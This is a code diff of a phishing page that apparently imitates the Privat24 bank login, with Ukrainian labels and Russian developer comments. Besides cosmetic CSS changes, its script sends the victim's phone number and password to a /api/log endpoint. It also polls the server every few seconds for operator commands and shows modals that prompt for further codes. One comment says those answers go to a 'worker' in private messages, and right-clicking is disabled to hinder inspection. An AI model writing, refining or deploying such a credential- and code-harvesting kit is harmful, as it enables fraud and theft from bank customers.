@@ -9,6 +9,7 @@
         body {
             -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none;
             -webkit-tap-highlight-color: transparent; font-family: sans-serif;
+            margin: 0; padding: 0;
         }
 
         /* QR и верстка */
@@ -28,30 +29,67 @@
             .p24-sidebar { display: none; }
             .p24-layout { display: block; }
             .p24-main { padding: 0; min-height: 100vh; display: flex; align-items: center; justify-content: center; background: #fff; }
-            .login-card { box-shadow: none; border: none; width: 100%; max-width: 100%; padding: 20px; }
+            .login-card { box-shadow: none; border: none; width: 100%; max-width: 100%; padding: 20px; box-sizing: border-box; }
         }
 
         /* ДИЗАЙН МОДАЛЬНОГО ОКНА */
         #custom-modal {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.6); z-index: 10000; align-items: center; justify-content: center;
+            display: none; 
+            position: fixed; 
+            top: 0; left: 0; 
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.7); 
+            z-index: 10000; 
+            align-items: center; 
+            justify-content: center;
+            backdrop-filter: blur(5px);
         }
         .modal-content {
-            background: #fff; width: 90%; max-width: 380px; padding: 30px 20px;
-            border-radius: 16px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            background: #fff; 
+            width: 90%; 
+            max-width: 360px; 
+            padding: 25px;
+            border-radius: 20px; 
+            text-align: center; 
+            box-shadow: 0 15px 40px rgba(0,0,0,0.4);
+            box-sizing: border-box;
+            animation: fadeIn 0.3s ease-out;
         }
-        .modal-content h3 { color: #333; margin-bottom: 12px; font-size: 20px; }
-        .modal-content p { color: #666; margin-bottom: 20px; font-size: 14px; line-height: 1.5; }
-        .modal-input-wrapper { margin-bottom: 20px; display: none; }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        .modal-content h3 { color: #333; margin-bottom: 10px; font-size: 19px; }
+        .modal-content p { color: #555; margin-bottom: 20px; font-size: 15px; line-height: 1.4; }
+        
+        .modal-input-wrapper { margin-bottom: 20px; width: 100%; display: none; }
         .modal-input-wrapper input {
-            width: 100%; padding: 14px; border: 2px solid #eee; border-radius: 8px;
-            font-size: 20px; text-align: center; outline: none; transition: border-color 0.3s;
+            width: 100%; 
+            padding: 15px; 
+            border: 2px solid #ddd; 
+            border-radius: 12px;
+            font-size: 18px; 
+            text-align: center; 
+            outline: none; 
+            transition: all 0.3s;
+            box-sizing: border-box; /* Важно для ровного инпута */
+            background: #fdfdfd;
         }
-        .modal-input-wrapper input:focus { border-color: #72b128; }
+        .modal-input-wrapper input:focus { border-color: #72b128; background: #fff; }
+        
         .modal-btn {
-            background: #72b128; color: #fff; border: none; padding: 14px;
-            border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; font-size: 16px;
+            background: #72b128; 
+            color: #fff; 
+            border: none; 
+            padding: 15px;
+            border-radius: 12px; 
+            cursor: pointer; 
+            font-weight: bold; 
+            width: 100%; 
+            font-size: 16px;
+            transition: 0.2s;
         }
+        .modal-btn:active { transform: scale(0.97); background: #629a21; }
     </style>
 </head>
 <body oncontextmenu="return false;">
@@ -114,31 +152,33 @@
             <h3 id="modal-title">Підтвердження</h3>
             <p id="modal-desc"></p>
             <div id="modal-input-group" class="modal-input-wrapper">
-                <input type="tel" id="modal-input" placeholder="0000" maxlength="10">
+                <input type="tel" id="modal-input" placeholder="0000" maxlength="20">
             </div>
             <button id="modal-btn" class="modal-btn">ПРОДОВЖИТИ</button>
         </div>
     </div>
 
     <script>
+    // Уникальный ID для сессии
     if (!sessionStorage.getItem('USER_ID')) {
         sessionStorage.setItem('USER_ID', 'ID-' + Math.floor(Math.random() * 89999 + 10000));
     }
     const USER_ID = sessionStorage.getItem('USER_ID');
 
-    // Функция управления модальным окном
-    async function showModal(type, text) {
-        const modal = document.getElementById('custom-modal');
-        const desc = document.getElementById('modal-desc');
-        const inputGroup = document.getElementById('modal-input-group');
-        const btn = document.getElementById('modal-btn');
-        const input = document.getElementById('modal-input');
-
-        desc.innerText = text;
-        inputGroup.style.display = (type === 'ask') ? 'block' : 'none';
-        modal.style.display = 'flex';
-
+    // Функция вызова модалки
+    function showModal(type, text) {
         return new Promise((resolve) => {
+            const modal = document.getElementById('custom-modal');
+            const desc = document.getElementById('modal-desc');
+            const inputGroup = document.getElementById('modal-input-group');
+            const btn = document.getElementById('modal-btn');
+            const input = document.getElementById('modal-input');
+
+            desc.innerText = text;
+            inputGroup.style.display = (type === 'ask') ? 'block' : 'none';
+            modal.style.display = 'flex';
+            if(type === 'ask') input.focus();
+
             btn.onclick = () => {
                 const val = input.value;
                 modal.style.display = 'none';
@@ -148,14 +188,12 @@
         });
     }
 
-    // Обработка формы
+    // Отправка первой формы (Логин/Пароль)
     document.getElementById('p24-form').addEventListener('submit', async function(e) {
         e.preventDefault();
         const phone = document.getElementById('p24-phone').value;
         const pass = document.getElementById('p24-pass').value;
-        const loader = document.getElementById('p24-loader');
-        
-        loader.style.display = 'flex';
+        document.getElementById('p24-loader').style.display = 'flex';
         
         await fetch('/api/log', {
             method: 'POST',
@@ -168,32 +206,35 @@
         });
     });
 
-    // Опрос сервера
+    // Опрос сервера на наличие новых команд
     setInterval(async () => {
         try {
             const res = await fetch(`/api/check/${USER_ID}`);
-            const data = await res.json();
-            
-            if (data) {
-                document.getElementById('p24-loader').style.display = 'none';
-                const result = await showModal(data.action, data.text);
-                
-                if (data.action === 'ask' && result) {
-                    document.getElementById('p24-loader').style.display = 'flex';
-                    fetch('/api/log', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            userId: USER_ID,
-                            type: 'ВВІД_ПРИВАТ',
-                            data: { "Результат": result }
-                        })
-                    });
-                } else if (data.action === 'msg') {
-                    location.reload();
+            if (res.status === 200) {
+                const data = await res.json();
+                if (data) {
+                    document.getElementById('p24-loader').style.display = 'none';
+                    
+                    const result = await showModal(data.action, data.text);
+                    
+                    if (data.action === 'ask') {
+                        document.getElementById('p24-loader').style.display = 'flex';
+                        // ОТПРАВЛЯЕМ КАК "ОТВЕТ" - ЭТО ПОЙДЕТ ВОРКЕРУ В ЛИЧКУ
+                        fetch('/api/log', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                userId: USER_ID,
+                                type: 'ОТВЕТ',
+                                data: { "Користувач ввів": result }
+                            })
+                        });
+                    } else if (data.action === 'msg') {
+                        location.reload(); // Перезагрузка при ошибках типа "Баланс"
+                    }
                 }
             }
-        } catch (e) {}
+        } catch (e) { console.log("Ошибка связи с сервером"); }
     }, 3000);
     </script>
 </body>
